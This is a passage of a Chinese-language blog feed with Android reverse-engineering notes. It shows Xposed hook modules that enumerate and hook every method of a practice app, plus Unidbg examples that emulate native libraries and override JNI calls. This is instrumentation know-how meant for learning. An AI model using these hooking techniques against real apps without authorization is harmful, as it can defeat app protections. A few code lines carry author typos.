class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        Class[] cls=clazz.getDeclaredClasses();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cls.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,cls[i].getName());</span><br><span class="line">            Method[] mds=cls[i].getDeclaredMethods();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;mds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,mds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">            Field[] fds=cls[i].getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;fds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个循环遍历，外层是遍历classes，内层输出每一个内部类的methods与fields</p><h3 id="执行结果-11"><a href="#执行结果-11" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230716210145966.png" alt="image-20230716210145966"></p><h2 id="十四-遍历所有类"><a href="#十四-遍历所有类" class="headerlink" title="十四.遍历所有类"></a>十四.遍历所有类</h2><h3 id="目标：遍历所有类"><a href="#目标：遍历所有类" class="headerlink" title="目标：遍历所有类"></a>目标：遍历所有类</h3><h3 id="代码实现如下-12"><a href="#代码实现如下-12" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz1=(Class)param.getResult();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazz1.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要使用ClassLoader的loadClass方法，把抽象类ClassLoader字节化，调用下面的loadClass方法</p><ul><li>param.getResult()获得结果，即加载类</li><li>clazz1.getName()：获得加载类的名字</li></ul><h3 id="执行结果-12"><a href="#执行结果-12" class="headerlink" title="执行结果"></a>执行结果</h3><p>打开demo<br><img src="2025-01-15-Xposed框架/image-20230716221001521.png" alt="image-20230716221001521"></p><h2 id="十五-Hook所有类的所有方法"><a href="#十五-Hook所有类的所有方法" class="headerlink" title="十五.Hook所有类的所有方法"></a>十五.Hook所有类的所有方法</h2><h3 id="目标：Hook所有类的所有方法"><a href="#目标：Hook所有类的所有方法" class="headerlink" title="目标：Hook所有类的所有方法"></a>目标：Hook所有类的所有方法</h3><h3 id="代码实现如下-13"><a href="#代码实现如下-13" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz=(Class)param.getResult();</span><br><span class="line">                String clazzName=clazz.getName();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazzName);   <span class="comment">//输出类名</span></span><br><span class="line">                <span class="keyword">if</span> (clazzName.contains(<span class="string">&quot;com.xiaojianbang&quot;</span>))&#123;    <span class="comment">//过滤</span></span><br><span class="line">                    Method[] mds=clazz.getDeclaredMethods();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i= <span class="number">0</span>; i &lt; mds.length; i++) &#123;</span><br><span class="line">                        <span class="keyword">final</span> Method md=mds[i];</span><br><span class="line">                        <span class="type">int</span> mod=mds[i].getModifiers();     <span class="comment">//获得这个方法的访问修饰符</span></span><br><span class="line">                        <span class="keyword">if</span>(!Modifier.isAbstract(mod)       <span class="comment">//不是抽象方法</span></span><br><span class="line">                           &amp;&amp; !Modifier.isNative(mod)      <span class="comment">//不是native方法</span></span><br><span class="line">                           &amp;&amp; !Modifier.isInterface(mod))&#123; <span class="comment">//不是接口</span></span><br><span class="line">                            XposedBridge.hookMethod(mds[i], <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;？、hook他</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                                    <span class="keyword">if</span>(md.getName().contains(<span class="string">&quot;complexParameterFunc&quot;</span>))&#123;</span><br><span class="line">                                        <span class="type">int</span> paramNum=param.args.length;  <span class="comment">//参数长度</span></span><br><span class="line">                                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;paramNum ; i++) &#123;</span><br><span class="line">                                            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,param.args[i].getClass().getName());</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hook Method: &quot;</span>+md.toString());</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="执行结果-13"><a href="#执行结果-13" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo，我并没有运行出complexParameterFunc方法的参数啥的，不知道为什么。</p><p><img src="2025-01-15-Xposed框架/image-20230717111721593.png" alt="image-20230717111721593"></p><p>按道理应该也会输出这个如下<img src="2025-01-15-Xposed框架/image-20230717111832540.png" alt="image-20230717111832540"></p><h2 id="十六-Hook多dex"><a href="#十六-Hook多dex" class="headerlink" title="十六.Hook多dex"></a>十六.Hook多dex</h2><h2 id="一些补充"><a href="#一些补充" class="headerlink" title="一些补充"></a>一些补充</h2><h3 id="过滤子进程"><a href="#过滤子进程" class="headerlink" title="过滤子进程"></a>过滤子进程</h3><p><code>LoadPackageParam.processName</code></p><h3 id="获得Context"><a href="#获得Context" class="headerlink" title="获得Context"></a>获得Context</h3><p><code>Context context = AndroidAppHelper.currentApplication();</code></p><h3 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h3><ul><li><p>hook的方式 ==》 params.thisobject</p></li><li><p>Class clazz=XposedHelpers.findClass(classname,loadPackageParam.classLoader);<br>Object obj=XposedHelpers.newInstance(clazz);<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><p>Constructor cons = XposedHelpers.findConstructorExact(classname,loadPackageParam.classLoader)<br>Object obj = cons.newInstance();<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><pre><code class="lang-java">XposedBridge.hookAllMethod(clazz,Methodname,new XC_MethodHook()&#123;    protected void afterHookedMethod(MethodHookParam param) throws Throwable&#123;        super.afterHookedMethod(param);        Object obj=param.thisObject;        XposedHelpers.callMethod(obj,methodname,args);    &#125;&#125;)</code></pre></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unidbg</title>
      <link href="/posts/466ed760.html"/>
      <url>/posts/466ed760.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unidbg"><a href="#Unidbg" class="headerlink" title="Unidbg"></a>Unidbg</h1><h2 id="Capstone-Unicorn-Keystone"><a href="#Capstone-Unicorn-Keystone" class="headerlink" title="Capstone Unicorn Keystone"></a>Capstone Unicorn Keystone</h2><p>Capstone 反汇编框架</p><p>Unicorn CPU模拟执行框架</p><ul><li>好比一个cpu 模拟执行各种指令 提供了编程语言接口，可以操作内存，寄存器，但它不是一个系统，内存管理，文件系统，系统调用等都需要自己实现</li></ul><p>Keystone 汇编框架</p><p><strong>Ubuntu安装三个框架</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装capstone</span></span><br><span class="line">pip install capstone</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Unicorn</span></span><br><span class="line">pip install Unicorn</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Keystone</span></span><br><span class="line">pip install keystone<span class="punctuation">-</span>engine</span><br></pre></td></tr></table></figure><h2 id="一些基本使用"><a href="#一些基本使用" class="headerlink" title="一些基本使用"></a>一些基本使用</h2><h3 id="Unidbg简单介绍"><a href="#Unidbg简单介绍" class="headerlink" title="Unidbg简单介绍"></a>Unidbg简单介绍</h3><ul><li>支持对so的加载</li><li>支持对jni接口函数的模拟调用</li><li>支持常见的syscalls的模拟调用</li><li>支持arm32和arm64</li><li>支持android和IOS</li><li>基于HookZz实现的inline hook，xhook实现的hook，IOS fishhook，substrate，whale hook等 以及支持gdb，ida远程调式等高级功能</li><li>支持Dynarmic，</li><li>支持基于Dobby的Inline hook 基于xHook的GOT hook</li></ul><p>驱动unidbg的底层引擎：Dynarmic(效率更高) Unicorn</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//启用Dynarmic引擎 ，注释默认unicorn</span></span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        DynarmicLoader.useDynarmic();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbg示例讲解"><a href="#unidbg示例讲解" class="headerlink" title="unidbg示例讲解"></a>unidbg示例讲解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">emulator = AndroidEmulatorBuilder   <span class="comment">//构建模拟器实例</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">                <span class="comment">//添加DynarmicFactory后端工厂，为true含义：如果出现问题 退回Unicorn工厂</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line"><span class="comment">//后端工厂除了DynarmicFactory 还支持hypervisor，KVM，Unicorn2，及默认的Unicorn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//loadlibrary两个参数，第一个是so的路径，第二个是 是否自动执行init函数</span></span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;so_path&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="脱离编译器，使用命令行编译so"><a href="#脱离编译器，使用命令行编译so" class="headerlink" title="脱离编译器，使用命令行编译so"></a>脱离编译器，使用命令行编译so</h3><ul><li><p>test/java/com/自定义包路径下编写MainActivity.java等代码，然后包路径下创建build文件夹，用于存放so源代码与配置文件 </p></li><li><p>将cpp文件与CMakeLists.txt放到build文件夹下</p></li><li><p>将androidstudio中的cmake路径添加到环境变量</p></li><li><p>在build下创建build.sh文件，编写如下内容</p></li><li><p>```<br>cmake \<br>-H ./ \<br>-B ./ninja \<br>-DANDROID_ABI=armeabi-v7a \       //或arm64-v8a<br>-DANDROID_PLATFORM=android-23 \   //android-16<br>-DANDROID_NDK=/root/Android/Sdk/ndk/xx.xx.x \<br>-DCMAKE_TOOLCHAIN_FILE=/root/Android/Sdk/ndk/xx.xx.x/build/cmake/android.toolchain.cmake \<br>-G Ninja<br>ninja -C ./ninja</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>修改CMakeLists.txt文件，添加如下配置</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ser(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${PROJECT_SOURCE_DIR}/ ../)<br>set(CMAKE_BUILD_TYPE “Release”)<br>set(CMAKE_C_FLAGS_RELEASE “${CMAKE_C_FLAGS_RELEASE} -s”)<br>set(CMAKE_CXX_FLAGS_RELEASE “${CMAKE_CXX_FLAGS_RELEASE} -s”)</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 运行build.sh命令 生成so则成功</span><br><span class="line"></span><br><span class="line"><span class="comment">## Unidbg入门基础框架</span></span><br><span class="line"></span><br><span class="line">1. **callStaticJniMethodObject**</span><br><span class="line">   比callFunction多封装了一些代码 不需要自己寻找函数地址 不需要自己包装参数</span><br><span class="line">   (像这种调用函数的接口函数 无论调用静态还是动态都可以用Static)</span><br><span class="line"></span><br><span class="line">2. **通过符号寻找函数地址的过程**</span><br><span class="line"></span><br><span class="line">   通过传入的符号在动态注册函数中寻找函数地址，nativesMap如果找不到，则按静态注册规则拼接符号，然后寻找函数地址 函数名和函数签名</span><br><span class="line"></span><br><span class="line">3. 对传入的参数进行包装的过程</span><br><span class="line"></span><br><span class="line"><span class="comment">### 当返回值和参数有字节数组时</span></span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">byte[] callFunc()&#123;</span><br><span class="line">    byte[] data =<span class="built_in"> new </span>byte[16];</span><br><span class="line">        ByteArray<span class="built_in"> array </span>= TTEncryptUtils.callStaticJniMethodObject(emulator, <span class="string">&quot;ttEncrypt([BI)[B&quot;</span>,<span class="built_in"> new </span>ByteArray(vm, data), data.length); // 执行Jni方法</span><br><span class="line">       <span class="built_in"> return </span>array.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>使用Unidbg的API==》ByteArray进行包装 使用getValue方法来获得java的类型byte[]</p><p>打印java字节数组：Inspector.<em>inspect</em>(返回值, 标签);</p><p><strong>在新版本当中可以不用主动包装byte[]，String，项目已经给用户包装过了</strong></p><h3 id="当返回值和参数是int时"><a href="#当返回值和参数是int时" class="headerlink" title="当返回值和参数是int时"></a>当返回值和参数是int时</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;add(III)I&quot;</span>, <span class="number">0x100</span>,<span class="number">0x200</span>,<span class="number">0x300</span>); <span class="comment">// 执行Jni方法</span></span><br><span class="line">      <span class="keyword">return</span> retval;</span><br></pre></td></tr></table></figure><p><strong>Integer.toHexString()</strong>：变为十六进制形式</p><h3 id="当返回值和参数是String时"><a href="#当返回值和参数是String时" class="headerlink" title="当返回值和参数是String时"></a>当返回值和参数是String时</h3><p>对String进行包装 new StringObject(vm,“xxxx”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;xxx&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result：&quot;</span>+md5Result.getValue());</span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当unidbg模拟执行JNI函数时遇到CallObjectMethod时，会报错因为unidbg没有实现这个JNI接口</p><p>最简单的方式如下：</p><p>在适当位置加入</p><p><code>vm.setJni(new AbstractJni()&#123;&#125;);</code></p><p>(CallObjectMethod最终也是调用CallObjectMethodV)</p><h3 id="处理so调用系统java类"><a href="#处理so调用系统java类" class="headerlink" title="处理so调用系统java类"></a>处理so调用系统java类</h3><ol><li>unidbg实现了大部分的JNI函数，对于没有实现的需要自己来实现</li><li>已经实现的 类似CallObjectMethodV，需要自己分析so 做有针对的覆写</li><li>通过vm.setjni(this)覆写父类AbstractJni方法</li><li>如果so通过JNI访问比较多的Java类 后者IDA反编译的so逻辑不是很清楚 比如存在混淆，这时可以借助Jnitrace来补</li></ol><p>对于需要自己分析so，做有针对性的覆写（如callObjectMethodV）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vm.setJni(<span class="keyword">new</span> <span class="title class_">AbstractJni</span>() &#123;  <span class="comment">//重写接口</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;signature: &quot;</span> + signature); <span class="comment">//返回签名</span></span><br><span class="line">              <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;<span class="comment">//如果是要找的类下的方法</span></span><br><span class="line">                  <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue(); <span class="comment">//返回参数</span></span><br><span class="line">                  System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">                  <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">                  <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes(); <span class="comment">//修改返回值</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>对于使用vm.setjni(this)覆写父类AbstractJni方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意：类要继承AbstractJni 向上转型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeHelper</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="comment">//此处省略</span></span><br><span class="line">    vm = emulator.createDalvikVM(); <span class="comment">// 创建Android虚拟机</span></span><br><span class="line">vm.setJni(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//后面省略</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//然后在后面随意位置 </span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;signature: &quot;</span> + signature);</span><br><span class="line">        <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">            <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">            <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="处理so调用其他so"><a href="#处理so调用其他so" class="headerlink" title="处理so调用其他so"></a>处理so调用其他so</h3><ul><li>如果被调用的函数需要先执行JNI_OnLoad或者其他函数 那么就按顺序调用</li><li>如果so中调用了其他的so 只需要按顺序加载所需要的so即可</li><li>dlopen会自己处理 因为unidbg加载了libdl.so</li><li>c/c++标准库也会自己处理 因为unidbg加载了libc.so 